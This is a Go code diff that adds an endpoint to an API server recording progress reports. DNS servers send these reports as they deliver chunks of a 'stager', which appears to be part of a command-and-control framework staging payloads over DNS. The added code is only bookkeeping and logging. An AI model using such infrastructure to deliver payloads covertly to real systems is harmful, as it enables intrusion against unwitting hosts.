@@ -1508,6 +1508,46 @@ func (api *APIServer) handleStagerChunk(w http.ResponseWriter, r *http.Request) 
 	api.sendJSON(w, response)
 }
 
+// StagerProgressRequest represents a progress report from DNS server
+type StagerProgressRequest struct {
+	DNSServerID string `json:"dns_server_id"`
+	SessionID   string `json:"session_id"`
+	ChunkIndex  int    `json:"chunk_index"`
+	StagerIP    string `json:"stager_ip"`
+}
+
+// handleStagerProgress processes stager chunk delivery progress reports from DNS servers
+func (api *APIServer) handleStagerProgress(w http.ResponseWriter, r *http.Request) {
+	var req StagerProgressRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	// Mark chunk as delivered in database
+	if err := api.db.MarkStagerChunkDelivered(req.SessionID, req.ChunkIndex); err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] Warning: Failed to mark chunk %d as delivered: %v\n", req.ChunkIndex, err)
+		}
+	}
+
+	// Update session activity
+	api.db.UpdateStagerSessionActivity(req.SessionID)
+
+	// Log progress (periodic batching could reduce logs)
+	if req.ChunkIndex%100 == 0 || api.config.Debug {
+		fmt.Printf("[API] 📊 Progress: Chunk %d delivered for session %s via DNS %s\n",
+			req.ChunkIndex, req.SessionID[:16], dnsServerID)
+	}
+
+	api.sendSuccess(w, "progress recorded", nil)
+}
+
 // SetupRoutes configures all API routes
 func (api *APIServer) SetupRoutes(router *mux.Router) {
 	// Web UI endpoints (serve HTML)
@@ -1579,6 +1619,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	// Stager protocol endpoints (called by DNS servers on behalf of stagers)
 	dnsRouter.HandleFunc("/stager/init", api.handleStagerInit).Methods("POST")
 	dnsRouter.HandleFunc("/stager/chunk", api.handleStagerChunk).Methods("POST")
+	dnsRouter.HandleFunc("/stager/progress", api.handleStagerProgress).Methods("POST")
 
 	// Health check endpoint (no auth)
 	router.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
